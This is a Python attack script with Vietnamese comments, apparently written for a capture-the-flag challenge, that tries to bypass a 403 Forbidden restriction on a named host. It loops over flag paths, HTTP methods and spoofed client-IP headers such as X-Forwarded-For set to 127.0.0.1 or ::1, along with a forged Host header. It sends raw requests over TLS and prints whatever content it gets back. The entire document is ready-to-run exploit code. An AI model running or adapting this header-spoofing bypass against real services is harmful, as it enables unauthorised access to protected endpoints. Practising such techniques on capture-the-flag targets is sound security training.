import socket
import ssl

def exploit_403():
    hostname = "netapp.bitskrieg.in"
    port = 443
    
    # 1. CỐ ĐỊNH HOST MỤC TIÊU (Đã xác định từ bước trước)
    target_host = "flag-service"

    # 2. DANH SÁCH PATH CẦN QUÉT
    paths = [
        "/",
        "/flag",            # Khả năng cao nhất
        "/flag.txt",
        "/api/flag",
        "/admin/flag",
        "/swagger/index.html", # Lỗi lộ document API thường gặp của .NET
        "/robots.txt"
    ]

    # 3. CÁC BIẾN THỂ IP SPOOFING (Đặc biệt chú ý IPv6)
    ip_payloads = [
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Forwarded-For", "::1"),           # IPv6 Localhost (QUAN TRỌNG VỚI .NET CORE)
        ("X-Real-IP", "127.0.0.1"),
        ("Client-IP", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Forwarded-Host", "flag-service")  # Kỹ thuật Double Host
    ]

    # 4. HTTP METHODS
    methods = ["GET", "POST"]

    print(f"🚀 Tấn công tập trung vào Host: {target_host}...")
    print("🎯 Mục tiêu: Vượt qua lỗi 403 Forbidden\n")

    context = ssl.create_default_context()
    
    for method in methods:
        for path in paths:
            for header_name, header_val in ip_payloads:
                try:
                    with socket.create_connection((hostname, port)) as sock:
                        with context.wrap_socket(sock, server_hostname=hostname) as ss:
                            
                            # Xây dựng Request
                            req = f"{method} {path} HTTP/1.1\r\n"
                            req += f"Host: {target_host}\r\n"
                            req += "Connection: close\r\n"
                            req += f"{header_name}: {header_val}\r\n"
                            req += "\r\n"
                            
                            ss.sendall(req.encode())
                            
                            # Nhận response
                            response = b""
                            while True:
                                data = ss.recv(4096)
                                if not data: break
                                response += data
                            
                            decoded = response.decode(errors='replace')
                            status_line = decoded.splitlines()[0] if decoded else "No Resp"
                            
                            # LOGIC KIỂM TRA CHIẾN THẮNG
                            # Nếu KHÔNG phải 403 và KHÔNG phải 404 => Có biến!
                            if "403" not in status_line and "404" not in status_line:
                                print(f"\n🔥🔥🔥 BINGO! BYPASS THÀNH CÔNG!")
                                print(f"👉 Payload: {method} {path}")
                                print(f"👉 Header:  {header_name}: {header_val}")
                                print(f"👉 Status:  {status_line}")
                                print("-" * 50)
                                print(decoded.split("\r\n\r\n")[1][:1000]) # In nội dung Flag
                                print("-" * 50)
                                return # Dừng ngay khi tìm thấy

                            # In tiến độ (chỉ in cái lạ)
                            if "403" not in status_line: 
                                print(f"[?] {method} {path} | {header_val} -> {status_line}")

                except Exception as e:
                    pass

    print("\n❌ Đã quét hết. Nếu vẫn 403, thử lại với X-Rewrite-URL.")

if __name__ == "__main__":
    exploit_403()